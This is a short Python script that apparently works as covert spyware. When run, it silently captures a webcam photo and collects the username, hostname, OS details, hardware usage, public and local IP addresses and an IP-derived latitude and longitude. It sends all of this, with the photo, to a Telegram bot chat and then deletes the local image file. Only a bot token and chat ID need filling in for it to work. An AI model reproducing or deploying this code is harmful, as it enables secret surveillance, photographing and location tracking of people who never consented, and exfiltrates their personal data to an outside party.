import requests
import datetime
import os, psutil, cv2
import platform, socket
import getpass

class Bot:
    def __init__(self):
        self.BOT_TOKEN = ""
        self.CHAT_ID = ""
        self.TELEGRAM_API_URL = f"https://api.telegram.org/bot{self.BOT_TOKEN}/sendMessage"
        self.Ip_Url = "https://api64.ipify.org/?format=json"
        self.Ip = requests.get(self.Ip_Url).json()["ip"]
        self.get_info_Url = f"https://ipinfo.io/{self.Ip}/json"
        self.send_url = f"https://api.telegram.org/bot{self.BOT_TOKEN}/sendPhoto"
        self.file_name = "screenshot.jpg"
        self.SEND_LOCATION_URL = f"https://api.telegram.org/bot{self.BOT_TOKEN}/sendLocation"
        self.city = requests.get(self.get_info_Url).json()["city"]
        self.lac = requests.get(self.get_info_Url).json()["loc"]
        self.region = requests.get(self.get_info_Url).json()["region"]

    def Cv2(self):
        cap = cv2.VideoCapture(0)
        if not cap.isOpened():
            return (
                "Camera is not available"
            )

        ret, frame = cap.read()
        if ret:
            cv2.imwrite(
                self.file_name,
                frame
            )


        else:
            return (
                "Camera is not available"
            )

        cap.release()
        cv2.destroyAllWindows()


    def Get_Info_sys(self):
        return (f"""
🕒 <b>Time</b>: {datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")}
📊 <b>System</b>: {platform.node()}
🔧 <b>Processor</b>: {platform.processor()}
👤 <b>User</b>: {getpass.getuser()}
📊 <b>OS</b>: {platform.system()} {platform.version()}
🔋 <b>Battery</b>: {psutil.sensors_battery().percent}
📊 <b>RAM</b>: {psutil.virtual_memory().percent}
📊 <b>CPU</b>: {psutil.cpu_percent()}
📊 <b>Disk</b>: {psutil.disk_usage("/").percent}
🌍 <b>Location</b>: {self.city}, {self.region}
📍 <b>Latitude</b>: {self.lac.split(",")[0]}
📍 <b>Longitude</b>: {self.lac.split(",")[1]}
🌐 <b>Local IP</b>: {socket.gethostbyname(socket.gethostname())}
🌐 <b>Public IP</b>: {self.Ip}
            """)

    def SendTo_Bot(self):
        if not hasattr(self,"file_name"):
            print("No file to send.")
            return

        with open(self.file_name,"rb") as file:
            files = {
                "photo": file
            }
            data = {
                "chat_id": self.CHAT_ID,
                "caption": str(self.Get_Info_sys()),
                "parse_mode": "HTML"
            }

            data_2 = {
                "chat_id": self.CHAT_ID,
                "latitude": self.lac.split(",")[0],
                "longitude": self.lac.split(",")[1]
            }

            requests.post(
                self.send_url,
                files=files,
                data=data
            )
            requests.post(
                self.SEND_LOCATION_URL,
                data=data_2
            )

        os.remove("screenshot.jpg")


if __name__ == "__main__":
    Bot().Cv2()
    Bot().SendTo_Bot()
